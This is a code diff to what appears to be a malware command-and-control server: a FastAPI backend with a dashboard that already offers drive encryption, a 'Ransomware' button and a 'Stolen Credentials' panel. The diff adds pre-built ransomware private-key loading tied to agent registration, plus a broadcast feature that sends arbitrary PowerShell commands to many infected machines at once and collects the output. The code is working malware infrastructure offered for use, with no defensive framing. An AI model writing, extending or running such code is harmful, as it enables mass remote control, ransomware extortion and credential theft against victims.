@@ -112,6 +112,7 @@ async def _cleanup_udp_frags():
 
 async def lifespan(app: FastAPI):
     os.makedirs("downloads", exist_ok=True)
+    _load_agent_keys()
     cleanup_task = asyncio.create_task(_cleanup_loop())
     frag_task = asyncio.create_task(_cleanup_udp_frags())
 
@@ -258,6 +259,32 @@ class ServerState:
 state = ServerState()
 known_clients = {}  # device_id -> {hostname, os, status, first_seen, last_seen}
 agent_keys = {}  # device_id -> [{privkey, hostname, ts, device_id}, ...]
+_broadcast_results = {}  # device_id -> [output lines]
+
+def _load_agent_keys():
+    """Scan keys/ directory for pre-built agent private keys."""
+    keys_dir = os.path.join(os.getcwd(), "keys")
+    if not os.path.isdir(keys_dir):
+        return
+    for agent_name in os.listdir(keys_dir):
+        priv_path = os.path.join(keys_dir, agent_name, "private.pem")
+        if os.path.isfile(priv_path):
+            try:
+                with open(priv_path) as f:
+                    privkey = f.read()
+                # Store keyed by agent_name so it can be looked up on registration
+                if agent_name not in agent_keys:
+                    agent_keys[agent_name] = []
+                agent_keys[agent_name].append({
+                    "privkey": privkey,
+                    "hostname": agent_name,
+                    "device_id": agent_name,
+                    "ts": os.path.getmtime(priv_path),
+                    "source": "build",
+                })
+                logger.info(f"🔑 Loaded pre-built key for '{agent_name}'")
+            except Exception as ex:
+                logger.warning(f"Failed to load key for '{agent_name}': {ex}")
 
 # ─── Dashboard HTML ───────────────────────────────────────────
 DASHBOARD = """<!DOCTYPE html>
@@ -523,6 +550,10 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
     <div id="disconnectBar" style="display:none;padding:4px 12px 8px">
         <button onclick="doDisconnect()" style="width:100%;background:rgba(255,77,125,.15);color:#ff4d7d;border:1px solid rgba(255,77,125,.3);border-radius:6px;padding:6px;cursor:pointer;font-size:10px;font-weight:700;font-family:inherit">✕ Disconnect from current node</button>
     </div>
+    <div style="padding:6px 12px 8px;display:flex;gap:4px;flex-wrap:wrap">
+        <button onclick="toggleAllChecks()" style="background:rgba(0,245,255,.08);border:1px solid rgba(0,245,255,.2);color:var(--cyan);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:9px;font-weight:600">☐ All</button>
+        <button onclick="openM('bcm')" style="background:rgba(255,46,166,.12);border:1px solid rgba(255,46,166,.3);color:var(--magenta);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:9px;font-weight:600">📡 Broadcast</button>
+    </div>
     <div class="log-panel">
         <div class="log-header"><span>Server Logs</span><button class="bsm" onclick="loadLogs()">Refresh</button></div>
         <pre id="logArea">Loading logs...</pre>
@@ -670,7 +701,7 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
             <hr style="border-color:var(--border);margin:12px 0">
             <h3 style="color:var(--cyan);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px">🔓 Decryption Tools</h3>
             <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">
-                <button class="btn" onclick="doEnc()" title="Encrypt all drives with new RSA keypair">🔐 Encrypt All Drives</button>
+                <button class="btn" onclick="doEnc()" title="Encrypt all drives with embedded public key">🔐 Encrypt All Drives</button>
                 <button class="btn bng" onclick="doDec()" title="Decrypt all drives using stored key">🔓 Decrypt All Drives</button>
                 <button class="btn br" onclick="doRansomware()" style="background:linear-gradient(135deg,#ff2a2a,#aa0000)">☢️ Ransomware</button>
                 <button class="btn" onclick="doUnlockRansom()" title="Unlock ransomware after key injection">🔓 Unlock Ransomware</button>
@@ -678,6 +709,21 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
             <hr style="border-color:var(--border);margin:12px 0">
             <h3 style="color:var(--gold);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px">🕵️ Stolen Credentials</h3>
             <pre id="vd" style="color:var(--green);font-family:monospace;white-space:pre-wrap;background:#060a16;padding:12px;border-radius:6px;border:1px solid var(--border);max-height:300px;overflow:auto"></pre>
+        </div>
+    </div>
+</div>
+
+<!-- BROADCAST MODAL -->
+<div id="bcm" class="ov" onclick="if(event.target===this)closeM('bcm')">
+    <div class="mb mb-term" style="max-width:800px" onclick="event.stopPropagation()">
+        <div class="mh"><span>📡 Broadcast Command</span><button onclick="closeM('bcm')">✕ Close</button></div>
+        <div class="mc" style="display:flex;flex-direction:column;gap:10px">
+            <p style="color:var(--muted);font-size:12px">Command will be sent to <span id="bcTargetCount">0</span> selected agent(s).</p>
+            <input type="text" id="bcCmd" placeholder="PowerShell command..." style="background:rgba(0,12,24,.6);border:1px solid var(--border);color:#fff;padding:10px 14px;border-radius:8px;font-size:13px;font-family:monospace">
+            <button class="btn" onclick="doBroadcast()">📡 Send to Selected Agents</button>
+            <hr style="border-color:var(--border)">
+            <h3 style="color:var(--cyan);font-size:11px;letter-spacing:2px;text-transform:uppercase">Results</h3>
+            <div id="bcResults" style="background:#030810;border:1px solid var(--border);border-radius:8px;padding:12px;font-family:monospace;font-size:11px;color:#b8e8ff;max-height:400px;overflow:auto;white-space:pre-wrap"></div>
         </div>
     </div>
 </div>
@@ -1517,6 +1563,7 @@ document.addEventListener('keydown',e=>{
 function openM(id){
     document.getElementById(id).classList.add('open');
     if(id==='vm') loadKeys();
+    if(id==='bcm') updateBcCount();
 }
 function closeM(id){document.getElementById(id).classList.remove('open')}
 
@@ -1562,13 +1609,15 @@ async function sync(){
             const lastSeen = info.status === 'offline'
                 ? '<span class="last-seen">last seen ' + Math.floor((Date.now()/1000 - (info.last_seen||0))/60) + 'm ago</span>'
                 : '';
-            d.innerHTML=`<b>${name}</b><span class="os">${os.length>30?os.substring(0,30)+'...':os}</span>${online_badge}${lastSeen}`;
+            const chk = info.status === 'online' ? `<input type="checkbox" class="agent-chk" data-id="${id}" style="position:absolute;right:8px;top:8px;accent-color:var(--cyan);width:14px;height:14px;cursor:pointer" onclick="event.stopPropagation()">` : '';
+            d.innerHTML=`${chk}<b>${name}</b><span class="os">${os.length>30?os.substring(0,30)+'...':os}</span>${online_badge}${lastSeen}`;
             d.onclick = () => {
                 if(info.status === 'offline') return;
                 sel(id, info.info || info);
             };
             el.appendChild(d);
         });
+        updateBcCount();
     }catch(e){
         console.error('Sync failed:', e.name, e.message);
         if(statusEl) statusEl.textContent='Status: error loading clients';
@@ -1587,6 +1636,62 @@ function doDisconnect(){
     if(statusEl) statusEl.textContent='Status: disconnected';
     const el=document.getElementById('clist');
     if(el) el.querySelectorAll('.nd').forEach(n=>n.classList.remove('act'));
+}
+let _bcTimer=null;
+function updateBcCount(){
+    const checked=document.querySelectorAll('.agent-chk:checked').length;
+    const el=document.getElementById('bcTargetCount');
+    if(el) el.textContent=checked;
+}
+function toggleAllChecks(){
+    const cbs=document.querySelectorAll('.agent-chk');
+    const allChecked=Array.from(cbs).every(cb=>cb.checked);
+    cbs.forEach(cb=>cb.checked=!allChecked);
+    updateBcCount();
+}
+async function doBroadcast(){
+    const cmd=document.getElementById('bcCmd').value;
+    if(!cmd){alert('Enter a command first.');return;}
+    const checked=document.querySelectorAll('.agent-chk:checked');
+    if(!checked.length){alert('Select at least one agent.');return;}
+    const targets=Array.from(checked).map(cb=>cb.dataset.id);
+    const resEl=document.getElementById('bcResults');
+    resEl.innerHTML='> Sending command to '+targets.length+' agents...\\n';
+    try{
+        const r=await fetch('/broadcast', {
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({cmd:cmd,targets:targets,shellId:'broadcast'}),
+        });
+        const j=await r.json();
+        resEl.innerHTML+='> Broadcast sent to '+j.sent+'/'+j.total+' agents.\\n\\n';
+        // Poll for results
+        let polls=0;
+        if(_bcTimer) clearInterval(_bcTimer);
+        _bcTimer=setInterval(async ()=>{
+            try{
+                const rr=await fetch('/broadcast_results');
+                const results=await rr.json();
+                let out='';
+                const ids=Object.keys(results);
+                if(ids.length>0){
+                    ids.forEach(did=>{
+                        const lines=(results[did]||[]).join('\\n');
+                        if(lines) out+=`[${did.slice(0,8)}]\\n${lines}\\n\\n`;
+                    });
+                    resEl.innerHTML+=out;
+                }
+                polls++;
+                if(polls>20||ids.length>=targets.length){
+                    clearInterval(_bcTimer);
+                    _bcTimer=null;
+                    resEl.innerHTML+='--- Broadcast complete ---\\n';
+                }
+            }catch(e){}
+        },2000);
+    }catch(e){
+        resEl.innerHTML+='Error: '+e.message+'\\n';
+    }
 }
 async function loadLogs(){
     try{
@@ -1661,6 +1766,15 @@ async def ws_client(websocket: WebSocket):
                         "first_seen": known_clients.get(device_id, {}).get("first_seen", time.time()),
                         "last_seen": time.time(),
                     }
+                    # Auto-associate pre-built key by agent_name
+                    agent_name = info.get("agent_name", "")
+                    if agent_name and agent_name in agent_keys:
+                        # Copy pre-built keys to also be indexed by device_id
+                        if device_id not in agent_keys:
+                            agent_keys[device_id] = []
+                        for entry in agent_keys[agent_name]:
+                            agent_keys[device_id].append(dict(entry, device_id=device_id))
+                        logger.info(f"🔑 Auto-associated pre-built key for '{agent_name}' with {device_id[:8]}...")
                     udp_info = f" (UDP:{STREAM_PORT or 'auto'})" if STREAM_PORT != 0 else ""
                     logger.info(f"✅ Node registered: {data['data'].get('hostname', '?')} ({device_id[:8]}...){udp_info}")
                 elif device_id:
@@ -1678,6 +1792,11 @@ async def ws_client(websocket: WebSocket):
                                 "ts": time.time(),
                             })
                             logger.info(f"🔑 Private key stored for {device_id[:8]}... ({len(agent_keys[device_id])} keys)")
+                        elif data.get("cmd") == 0x0F and data.get("data", {}).get("shellId") == "broadcast":
+                            out = data.get("data", {}).get("out", "")
+                            if device_id not in _broadcast_results:
+                                _broadcast_results[device_id] = []
+                            _broadcast_results[device_id].append(out)
                         else:
                             await session.broadcast_text(data)
     except WebSocketDisconnect:
@@ -1862,6 +1981,37 @@ async def get_known_clients():
 @app.get("/agent_keys")
 async def get_agent_keys():
     return agent_keys
+
+
+@app.post("/broadcast")
+async def broadcast_command(request: Request):
+    """Send a shell command to all (or selected) agents. Body: {cmd: "...", targets: ["id1"]|"*", shellId: "broadcast"}"""
+    body = await request.json()
+    command = body.get("cmd", "")
+    targets = body.get("targets", "*")
+    shell_id = body.get("shellId", "broadcast")
+    if not command:
+        return JSONResponse({"status": "error", "msg": "No command"}, status_code=400)
+
+    _broadcast_results.clear()
+    payload = json.dumps({"cmd": 0x0F, "args": {"cmd": command, "shellId": shell_id}})
+    sent = 0
+    if targets == "*":
+        targets = list(state.clients.keys())
+    for cid in targets:
+        session = state.clients.get(cid)
+        if session:
+            try:
+                await session.agent_send_text(payload)
+                sent += 1
+            except Exception:
+                pass
+    return JSONResponse({"status": "ok", "sent": sent, "total": len(targets)})
+
+
+@app.get("/broadcast_results")
+async def get_broadcast_results():
+    return _broadcast_results
 
 
 @app.get("/stats")
